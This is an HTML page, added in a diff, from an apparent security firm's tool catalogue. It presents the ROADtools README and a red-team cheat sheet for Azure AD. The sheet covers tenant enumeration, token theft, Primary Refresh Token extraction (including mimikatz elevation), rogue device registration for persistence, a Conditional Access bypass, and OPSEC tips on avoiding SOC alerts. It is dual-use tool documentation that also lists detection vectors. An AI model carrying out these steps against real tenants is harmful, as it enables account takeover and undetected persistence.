@@ -1,0 +1,580 @@
+<!doctype html>
+<html lang="en-GB">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src 'self' data:; style-src 'self'; script-src 'self'; base-uri 'self'; form-action 'self'; connect-src 'self'">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ROADtools - Breachcraft Dev</title>
+<meta name="description" content="*(Rogue Office 365 and Azure (active) Directory tools)*">
+<link rel="canonical" href="https://breachcraft.dev/tools/roadtools/">
+<link rel="icon" href="/assets/mark.svg" type="image/svg+xml">
+<link rel="stylesheet" href="/styles.css">
+<meta name="theme-color" content="#0b1014">
+</head>
+<body>
+<main>
+  <p class="brand">Breachcraft<span>Dev</span></p>
+  <p class="badge"><span>Azure tool</span> upstream README &middot; captured 22 Nov 2026</p>
+  <p class="kicker">ROADtools</p>
+  <h1>ROADtools</h1>
+  <p class="lede">*(Rogue Office 365 and Azure (active) Directory tools)*</p>
+  <h2>What it is</h2>
+<p><em>(<strong>R</strong>ogue <strong>O</strong>ffice 365 and <strong>A</strong>zure (active) <strong>D</strong>irectory tools)</em></p>
+<p>ROADtools is a framework to interact with Azure AD. It consists of a library (roadlib) with common components, the ROADrecon Azure AD exploration tool and the ROADtools Token eXchange (roadtx) tool.</p>
+<h3>ROADlib</h3>
+<p>ROADlib is a library that can be used to authenticate with Azure AD or to build tools that integrate with a database containing ROADrecon data. The database model in ROADlib is automatically generated based on the metadata definition of the Azure AD internal API. ROADlib lives in the ROADtools namespace, so to import it in your scripts use <code>from roadtools.roadlib import X</code></p>
+<h3>ROADrecon</h3>
+<p>ROADrecon is a tool for exploring information in Azure AD from both a Red Team and Blue Team perspective. In short, this is what it does:</p>
+<ul>
+<li>Uses an automatically generated metadata model to create an SQLAlchemy backed database on disk.</li>
+<li>Use asynchronous HTTP calls in Python to dump all available information in the Azure AD graph to this database.</li>
+<li>Provide plugins to query this database and output it to a useful format.</li>
+<li>Provide an extensive interface built in Angular that queries the offline database directly for its analysis.</li>
+</ul>
+<p>ROADrecon uses <code>async</code> Python features and is only compatible with Python 3.9 and newer (development is done with Python 3.11, tests are run with versions up to Python 3.13).</p>
+<h4>Installation</h4>
+<p>There are multiple ways to install ROADrecon:</p>
+<p><strong>Using a published version on PyPi</strong> Stable versions can be installed with <code>pip install roadrecon</code>. This will automatically add the <code>roadrecon</code> command to your PATH.</p>
+<p><strong>Using a version from GitHub</strong> Every commit to master is automatically built into a release version with Azure Pipelines. This ensures that you can install the latest version of the GUI without having to install <code>npm</code> and all it's dependencies. You can download the <code>roadlib</code> and <code>roadrecon</code> build files from the <a href="https://dev.azure.com/dirkjanm/ROADtools/_build/latest?definitionId=19&amp;branchName=master">Azure Pipelines artifacts</a> (click on the button "1 Published". The build output files are stored in <code>ROADtools.zip</code>. You can either install the <code>.whl</code> or <code>.tar.gz</code> files directly using pip or unzip both and install the folders in the correct order (<code>roadlib</code> first):</p>
+<pre><code>pip install roadlib/
+pip install roadrecon/</code></pre>
+<p>You can also install them in development mode with <code>pip install -e roadlib/</code>.</p>
+<p><strong>Developing the front-end</strong> If you want to make changes to the Angular front-end, you will need to have <code>node</code> and <code>npm</code> installed. Then install the components from git:</p>
+<pre><code>git clone https://github.com/dirkjanm/roadtools.git
+pip install -e roadlib/
+pip install -e roadrecon/
+cd roadrecon/frontend/
+npm install</code></pre>
+<p>You can run the Angular frontend with <code>npm start</code> or <code>ng serve</code> using the Angular CLI from the <code>roadrecon/frontend/</code> directory. To build the JavaScript files into ROADrecon's <code>dist_gui</code> directory, run <code>npm run build</code>.</p>
+<h4>Using ROADrecon</h4>
+<p>See <a href="https://github.com/dirkjanm/ROADtools/wiki/Getting-started-with-ROADrecon">this Wiki page</a> on how to get started.</p>
+<h3>ROADtools Token eXchange (roadtx)</h3>
+<p>roadtx is a tool for exchanging and using different types of Azure AD issued tokens. It supports many different authentication flows, device registration and PRT related operations. For an overview of the tool, see the <a href="https://github.com/dirkjanm/ROADtools/wiki/ROADtools-Token-eXchange-(roadtx">roadtx Wiki</a>).</p>
+<h4>Installation</h4>
+<p>There are multiple ways to install roadtx. Note that roadtx requires Python 3.7 or newer.</p>
+<p><strong>Using a published version on PyPi</strong> Stable versions can be installed with <code>pip install roadtx</code>. This will automatically add the <code>roadtx</code> command to your PATH.</p>
+<p><strong>Using a version from GitHub</strong> You can clone this repository and install <code>roadlib</code> and then <code>roadtx</code> to make sure you have the latest versions of both the tool and the library:</p>
+<pre><code>pip install roadlib/
+pip install roadtx/</code></pre>
+<p>You can also install them in development mode with <code>pip install -e roadtx/</code>.</p>
+<h4>Using roadtx</h4>
+<p>See <a href="https://github.com/dirkjanm/ROADtools/wiki/ROADtools-Token-eXchange-(roadtx">the Wiki</a>) on how to use roadtx.</p>
+  <h2>Commands</h2>
+<ul class="facts"><li><strong>Type</strong> Python Framework (ROADrecon + roadtx + ROADlib)</li><li><strong>Purpose</strong> Rogue Office 365 and Azure Active Directory tools - recon, token manipulation, PRT operations</li><li><strong>Platform</strong> Windows, Linux, macOS</li><li><strong>Tags</strong> #azure #azuread #python #enumeration #tokens #prt #device-registration #recon #database</li></ul>
+<h3>Installation &amp; Setup</h3>
+<pre><code># Install stable versions from PyPi
+pip install roadrecon
+pip install roadtx
+
+# Or install from GitHub for latest
+git clone https://github.com/dirkjanm/ROADtools.git
+pip install roadlib/
+pip install roadrecon/
+pip install roadtx/
+
+# Verify installation
+roadrecon --help
+roadtx --help</code></pre>
+<p><strong>Requirements:</strong></p>
+<ul>
+<li>Python 3.9+ for ROADrecon</li>
+<li>Python 3.7+ for roadtx</li>
+</ul>
+<h3>ROADrecon Quick Reference</h3>
+<pre><code># Authenticate and gather data
+roadrecon auth -u user@company.com -p password
+roadrecon gather
+
+# Start web GUI
+roadrecon gui
+
+# Export data
+roadrecon dump
+roadrecon plugin policies</code></pre>
+<h3>roadtx Quick Reference</h3>
+<pre><code># Get access token
+roadtx gettokens -u user@company.com -p password
+
+# Describe current token
+roadtx describe
+
+# Get PRT from registry (Windows, admin)
+roadtx getprt
+
+# Register device
+roadtx device -a register
+
+# Get token using PRT
+roadtx prt -r roadtx.prt</code></pre>
+<h3>ROADrecon: Data Gathering &amp; Recon</h3>
+<h4>AUTH: Authentication Methods</h4>
+<p><strong>Use Case:</strong> Authenticate to Azure AD for data collection</p>
+<pre><code># Username and password
+roadrecon auth -u user@company.com -p 'P@ssw0rd!'
+
+# Access token
+roadrecon auth -t &lt;access-token&gt;
+
+# Refresh token
+roadrecon auth --refresh-token &lt;refresh-token&gt;
+
+# Refresh token from file
+roadrecon auth --tokens-from-file tokens.json
+
+# Authenticate and save tokens
+roadrecon auth -u user@company.com -p password --tokens-stdout &gt; tokens.json</code></pre>
+<h4>ENUM: Gather Azure AD Data</h4>
+<p><strong>Use Case:</strong> Collect all Azure AD information to local database</p>
+<pre><code># Full data gathering
+roadrecon gather
+
+# Gather with authentication
+roadrecon auth -u user@company.com -p password
+roadrecon gather
+
+# Specify output database
+roadrecon gather -d /path/to/database.db
+
+# Gather specific data only
+roadrecon gather --mfa-only
+roadrecon gather --service-principals-only</code></pre>
+<h4>ENUM: Interactive Web GUI</h4>
+<p><strong>Use Case:</strong> Browse collected data with web interface</p>
+<pre><code># Start GUI (default port 5000)
+roadrecon gui
+
+# Custom port
+roadrecon gui -p 8080
+
+# Specify database
+roadrecon gui -d /path/to/database.db
+
+# Access at http://localhost:5000</code></pre>
+<p><strong>GUI Features:</strong></p>
+<ul>
+<li>User enumeration and analysis</li>
+<li>Group membership visualization</li>
+<li>Service principal permissions</li>
+<li>Directory role assignments</li>
+<li>Conditional Access policies</li>
+<li>MFA status</li>
+<li>Device information</li>
+<li>Application consents</li>
+</ul>
+<h4>ENUM: Export Data (Plugins)</h4>
+<p><strong>Use Case:</strong> Export specific data types from database</p>
+<pre><code># List available plugins
+roadrecon plugin -h
+
+# Export all users to CSV
+roadrecon plugin users -o users.csv
+
+# Export groups
+roadrecon plugin groups -o groups.csv
+
+# Export service principals
+roadrecon plugin servicePrincipals -o sps.csv
+
+# Export directory roles
+roadrecon plugin directoryRoles -o roles.csv
+
+# Export devices
+roadrecon plugin devices -o devices.csv
+
+# Export Conditional Access policies
+roadrecon plugin policies -o ca-policies.json
+
+# Export OAuth permissions
+roadrecon plugin oauth2PermissionGrants -o oauth-permissions.csv
+
+# Dump all data
+roadrecon dump</code></pre>
+<h4>ENUM: Custom Queries</h4>
+<p><strong>Use Case:</strong> Query the SQLite database directly</p>
+<pre><code># Database location (default)
+# ~/.roadtools/roadrecon.db
+
+# Query with sqlite3
+sqlite3 ~/.roadtools/roadrecon.db
+
+# Example queries:
+SELECT * FROM users WHERE accountEnabled = 1;
+SELECT * FROM servicePrincipals;
+SELECT * FROM directoryRoles;
+SELECT * FROM oauth2PermissionGrants;</code></pre>
+<h3>roadtx: Token Operations</h3>
+<h4>CRED: Get Access Tokens</h4>
+<p><strong>Use Case:</strong> Obtain Azure AD access tokens via various methods</p>
+<pre><code># Username and password
+roadtx gettokens -u user@company.com -p 'P@ssw0rd!'
+
+# With MFA (device code flow)
+roadtx gettokens -u user@company.com -p password --device-code
+
+# Specify client and resource
+roadtx gettokens -u user@company.com -p password -c 1950a258-227b-4e31-a9cf-717495945fc2 -r https://graph.microsoft.com
+
+# Browser-based authentication
+roadtx gettokens --browser
+
+# Windows Integrated Auth (on domain-joined Windows)
+roadtx gettokens --windows-hello
+
+# Certificate-based authentication
+roadtx gettokens --pem-cert cert.pem --cert-thumbprint &lt;thumbprint&gt; --client-id &lt;client-id&gt; --tenant &lt;tenant-id&gt;
+
+# Using refresh token
+roadtx refreshtoken -r &lt;refresh-token&gt;
+
+# Save tokens to file
+roadtx gettokens -u user@company.com -p password -t tokens.json</code></pre>
+<h4>CRED: Token Analysis</h4>
+<p><strong>Use Case:</strong> Inspect and decode tokens</p>
+<pre><code># Describe current cached token
+roadtx describe
+
+# Describe token from file
+roadtx describe -t tokens.json
+
+# Decode specific token
+roadtx describe --jwt &lt;jwt-token&gt;
+
+# Shows:
+# - Token issuer
+# - Subject (user/app)
+# - Claims
+# - Expiration time
+# - Scopes/roles</code></pre>
+<h4>CRED: PRT Operations (Windows)</h4>
+<p><strong>Use Case:</strong> Extract and use Primary Refresh Token</p>
+<pre><code># Get PRT from Windows registry (requires admin/SYSTEM)
+roadtx getprt
+
+# Get PRT and session key
+roadtx getprt --key-pem session.key
+
+# Save PRT to file
+roadtx getprt -o roadtx.prt
+
+# Use PRT to get tokens
+roadtx prt -r roadtx.prt -c 1950a258-227b-4e31-a9cf-717495945fc2
+
+# Request token for specific resource using PRT
+roadtx prt -r roadtx.prt --resource https://graph.microsoft.com
+
+# Get token using PRT with session key
+roadtx prt -r roadtx.prt -k session.key</code></pre>
+<h4>PERSIST: Device Registration</h4>
+<p><strong>Use Case:</strong> Register rogue device to Azure AD</p>
+<pre><code># Register device
+roadtx device -a register -n DESKTOP-ATTACKER
+
+# Register and save certificate
+roadtx device -a register -n FAKE-DEVICE --cert-pem device.pem --key-pem device-key.pem
+
+# Register with specific tenant
+roadtx device -a register -n DEVICE01 --tenant company.onmicrosoft.com
+
+# List registered devices (from current user context)
+roadtx device -a list
+
+# Delete device registration
+roadtx device -a delete --device-id &lt;device-id&gt;</code></pre>
+<h4>PERSIST: PRT Cookie Generation</h4>
+<p><strong>Use Case:</strong> Generate browser cookies from PRT</p>
+<pre><code># Get PRT cookie for web access
+roadtx prtcookie -r roadtx.prt
+
+# Generate cookie for specific site
+roadtx prtcookie -r roadtx.prt --url https://portal.azure.com
+
+# Use session key with PRT
+roadtx prtcookie -r roadtx.prt -k session.key</code></pre>
+<h4>EXEC: Use Tokens with Tools</h4>
+<p><strong>Use Case:</strong> Export tokens for use with other tools</p>
+<pre><code># Get tokens and save
+roadtx gettokens -u user@company.com -p password -t tokens.json
+
+# Tokens saved in JSON format containing:
+# - access_token
+# - refresh_token
+# - id_token
+# - expires_in
+
+# Use with AADInternals
+# $token = (Get-Content tokens.json | ConvertFrom-Json).access_token
+
+# Use with az CLI
+# az account get-access-token
+
+# Use with PowerZure, etc.</code></pre>
+<h3>Attack Patterns</h3>
+<h4>Pattern: Compromised User → Full Tenant Enumeration</h4>
+<pre><code># 1. Authenticate with credentials
+roadrecon auth -u compromised@company.com -p 'password'
+
+# 2. Gather all tenant data
+roadrecon gather
+
+# 3. Start GUI and analyze
+roadrecon gui
+
+# 4. In GUI, explore:
+# - High-privilege users
+# - Service principals with high permissions
+# - Conditional Access policy gaps
+# - Applications with admin consent
+# - Devices without compliance</code></pre>
+<h4>Pattern: Token Theft → PRT Extraction → Persistence</h4>
+<pre><code># 1. Get initial access token
+roadtx gettokens -u user@company.com -p password -t initial-tokens.json
+
+# 2. If you get access to Windows machine (admin):
+roadtx getprt -o roadtx.prt --key-pem session.key
+
+# 3. PRT valid for 90 days, survives password changes
+
+# 4. Use PRT to get fresh tokens anytime
+roadtx prt -r roadtx.prt -k session.key -c &lt;client-id&gt; --resource https://graph.microsoft.com
+
+# 5. Register fake device for persistence
+roadtx device -a register -n LEGITIMATE-LAPTOP --cert-pem device.pem</code></pre>
+<h4>Pattern: Service Principal Analysis</h4>
+<pre><code># 1. Collect tenant data
+roadrecon auth -u user@company.com -p password
+roadrecon gather
+
+# 2. Export service principals
+roadrecon plugin servicePrincipals -o sps.csv
+
+# 3. Query for high-permission SPs
+sqlite3 ~/.roadtools/roadrecon.db
+SELECT * FROM oauth2PermissionGrants WHERE scope LIKE '%AppRoleAssignment%';
+
+# 4. Identify SPs with secrets you can access
+# 5. Use those SPs for privilege escalation</code></pre>
+<h4>Pattern: Conditional Access Bypass via Device Registration</h4>
+<pre><code># 1. Analyze CA policies
+roadrecon gather
+roadrecon plugin policies -o ca-policies.json
+
+# 2. If CA requires "compliant device"
+roadtx device -a register -n CORP-LAPTOP-001
+
+# 3. Device registration may satisfy "hybrid joined" requirement
+# 4. Use device certificate to authenticate
+roadtx gettokens --cert-pem device.pem --cert-key device-key.pem</code></pre>
+<h3>ROADrecon Database Schema</h3>
+<h4>Key Tables</h4>
+<p><strong>users</strong></p>
+<ul>
+<li>objectId, userPrincipalName, displayName, accountEnabled</li>
+<li>mfaDetail (MFA status)</li>
+<li>assignedRoles, memberOf</li>
+</ul>
+<p><strong>servicePrincipals</strong></p>
+<ul>
+<li>appId, displayName, objectId</li>
+<li>appRoles, oauth2Permissions</li>
+<li>passwordCredentials, keyCredentials</li>
+</ul>
+<p><strong>directoryRoles</strong></p>
+<ul>
+<li>roleTemplateId, displayName</li>
+<li>members (via link table)</li>
+</ul>
+<p><strong>groups</strong></p>
+<ul>
+<li>objectId, displayName, mailEnabled, securityEnabled</li>
+<li>members</li>
+</ul>
+<p><strong>oauth2PermissionGrants</strong></p>
+<ul>
+<li>clientId (service principal)</li>
+<li>resourceId (resource being accessed)</li>
+<li>scope (delegated permissions)</li>
+</ul>
+<p><strong>devices</strong></p>
+<ul>
+<li>deviceId, displayName, deviceOSType</li>
+<li>isCompliant, isManaged</li>
+<li>registeredOwners</li>
+</ul>
+<h3>Token Types &amp; Client IDs</h3>
+<h4>Common Client IDs</h4>
+<pre><code># Azure PowerShell
+1950a258-227b-4e31-a9cf-717495945fc2
+
+# Microsoft Graph PowerShell
+14d82eec-204b-4c2f-b7e8-296a70dab67e
+
+# Azure CLI
+04b07795-8ddb-461a-bbee-02f9e1bf7b46
+
+# Microsoft Office
+d3590ed6-52b3-4102-aeff-aad2292ab01c
+
+# Microsoft Teams
+1fec8e78-bce4-4aaf-ab1b-5451cc387264
+
+# Outlook
+00000002-0000-0ff1-ce00-000000000000
+
+# Use specific client ID
+roadtx gettokens -u user@company.com -p password -c 1950a258-227b-4e31-a9cf-717495945fc2</code></pre>
+<h4>Common Resources</h4>
+<pre><code># Microsoft Graph
+https://graph.microsoft.com
+
+# Azure Management
+https://management.azure.com
+
+# Azure AD Graph (legacy)
+https://graph.windows.net
+
+# Office 365 Management
+https://manage.office.com
+
+# Specify resource
+roadtx gettokens -u user@company.com -p password -r https://graph.microsoft.com</code></pre>
+<h3>Pro Tips</h3>
+<p>💡 <strong>Database Reuse</strong>: ROADrecon stores data in SQLite - can be shared with team 💡 <strong>PRT is Gold</strong>: PRT survives password changes, valid for 90 days 💡 <strong>Device Registration</strong>: Bypasses some Conditional Access policies 💡 <strong>Async Gathering</strong>: ROADrecon uses async calls for fast data collection 💡 <strong>GUI is Powerful</strong>: Web interface makes analysis much easier than raw database 💡 <strong>Token Refresh</strong>: Refresh tokens can last months to years 💡 <strong>Custom Queries</strong>: Direct SQLite queries give most flexibility 💡 <strong>Combine with AADInternals</strong>: Use ROADrecon for recon, AADInternals for exploitation 💡 <strong>Session Keys</strong>: PRT session key enables nonce validation bypass 💡 <strong>Certificate Auth</strong>: Device certificates harder to detect than passwords</p>
+<h3>OPSEC Considerations</h3>
+<p>⚠️ <strong>High Risk:</strong></p>
+<ul>
+<li>Device registration (logged in Azure AD, may alert SOC)</li>
+<li>Extensive data gathering (many Graph API calls)</li>
+<li>PRT extraction (requires admin/SYSTEM on Windows)</li>
+</ul>
+<p>⚠️ <strong>Medium Risk:</strong></p>
+<ul>
+<li>Using stolen PRT (generates authentication logs)</li>
+<li>Large-scale enumeration queries</li>
+<li>Exporting all tenant data</li>
+</ul>
+<p>✅ <strong>Lower Risk:</strong></p>
+<ul>
+<li>Standard token requests (matches normal user behavior)</li>
+<li>Reading data via Graph API (if within user's normal activity)</li>
+<li>Using refresh tokens (less suspicious than repeated password auth)</li>
+</ul>
+<p><strong>Detection Vectors:</strong></p>
+<ul>
+<li>Azure AD sign-in logs</li>
+<li>Device registration events</li>
+<li>Unusual Graph API query patterns</li>
+<li>Token requests from unexpected client IDs</li>
+<li>PRT-based authentication from new locations</li>
+</ul>
+<h3>Key Commands Reference</h3>
+<p><strong>ROADrecon:</strong></p>
+<ul>
+<li>Authentication: <code>roadrecon auth</code></li>
+<li>Data gathering: <code>roadrecon gather</code></li>
+<li>Web GUI: <code>roadrecon gui</code></li>
+<li>Export plugins: <code>roadrecon plugin</code></li>
+<li>Dump all: <code>roadrecon dump</code></li>
+</ul>
+<p><strong>roadtx:</strong></p>
+<ul>
+<li>Get tokens: <code>roadtx gettokens</code></li>
+<li>Refresh: <code>roadtx refreshtoken</code></li>
+<li>Describe: <code>roadtx describe</code></li>
+<li>PRT extraction: <code>roadtx getprt</code></li>
+<li>PRT usage: <code>roadtx prt</code></li>
+<li>PRT cookies: <code>roadtx prtcookie</code></li>
+<li>Device ops: <code>roadtx device</code></li>
+</ul>
+<h3>ROADrecon GUI Features</h3>
+<p>When you run <code>roadrecon gui</code>, you get a web interface with:</p>
+<p><strong>Dashboard:</strong></p>
+<ul>
+<li>Tenant overview</li>
+<li>User statistics</li>
+<li>MFA status summary</li>
+<li>Device compliance</li>
+</ul>
+<p><strong>Users:</strong></p>
+<ul>
+<li>List all users</li>
+<li>MFA status</li>
+<li>Assigned roles</li>
+<li>Group memberships</li>
+<li>Sign-in activity</li>
+</ul>
+<p><strong>Groups:</strong></p>
+<ul>
+<li>All groups</li>
+<li>Members</li>
+<li>Owners</li>
+<li>Dynamic membership rules</li>
+</ul>
+<p><strong>Service Principals:</strong></p>
+<ul>
+<li>Applications</li>
+<li>App permissions</li>
+<li>OAuth grants</li>
+<li>Owners</li>
+</ul>
+<p><strong>Directory Roles:</strong></p>
+<ul>
+<li>All roles</li>
+<li>Members</li>
+<li>Role assignments</li>
+</ul>
+<p><strong>Devices:</strong></p>
+<ul>
+<li>Registered/joined devices</li>
+<li>Compliance status</li>
+<li>Owners</li>
+</ul>
+<p><strong>Policies:</strong></p>
+<ul>
+<li>Conditional Access policies</li>
+<li>Policy conditions and controls</li>
+</ul>
+<h3>Troubleshooting</h3>
+<h4>Authentication Errors</h4>
+<pre><code># Check token validity
+roadtx describe -t tokens.json
+
+# Get fresh token
+roadtx refreshtoken -r &lt;refresh-token&gt;
+
+# Clear cached tokens
+rm ~/.roadtools_auth</code></pre>
+<h4>PRT Extraction Issues</h4>
+<pre><code># Requires admin/SYSTEM privileges
+# Run as SYSTEM:
+psexec -s -i cmd.exe
+roadtx getprt
+
+# Or use mimikatz:
+privilege::debug
+token::elevate
+roadtx getprt</code></pre>
+<h4>Database Issues</h4>
+<pre><code># Specify custom database location
+roadrecon gather -d /path/to/custom.db
+roadrecon gui -d /path/to/custom.db
+
+# Reset database (delete and re-gather)
+rm ~/.roadtools/roadrecon.db
+roadrecon gather</code></pre>
+<h3>Resources</h3>
+<ul>
+<li>GitHub: <a href="https://github.com/dirkjanm/ROADtools">https://github.com/dirkjanm/ROADtools</a></li>
+<li>Wiki: <a href="https://github.com/dirkjanm/ROADtools/wiki">https://github.com/dirkjanm/ROADtools/wiki</a></li>
+<li>roadtx Wiki: <a href="https://github.com/dirkjanm/ROADtools/wiki/ROADtools-Token-eXchange-(roadtx">https://github.com/dirkjanm/ROADtools/wiki/ROADtools-Token-eXchange-(roadtx</a>)</li>
+<li>ROADrecon Intro: <a href="https://dirkjanm.io/introducing-roadtools-token-exchange-roadtx/">https://dirkjanm.io/introducing-roadtools-token-exchange-roadtx/</a></li>
+<li>Blog: <a href="https://dirkjanm.io">https://dirkjanm.io</a></li>
+<li>Author: @_dirkjan (Dirk-jan Mollema)</li>
+</ul>
+  <p class="licence">Captured from <a href="https://github.com/AzureFactory/Azure_Offensive_Tooling">AzureFactory/Azure_Offensive_Tooling</a> on 22 Nov 2026. Upstream content, reproduced as captured; each tool keeps its own licence. Private, all rights reserved.</p>
+  <p class="action"><a href="/tools/">All tools</a> &rarr;</p>
+  <p class="small">Elsewhere &middot; <a href="https://breachcraftsecurity.com/">Services</a> &middot; <a href="https://breachcraft.academy/">Academy</a> &middot; <a href="https://breachcraft.app/">Labs</a> &middot; <a href="https://breachcraft.org/">Standards</a></p>
+  <p class="small">Breachcraft Security &middot; Evilsaint Ltd &middot; <a href="mailto:hello@breachcraftsecurity.com">hello@breachcraftsecurity.com</a></p>
+</main>
+</body>
+</html>
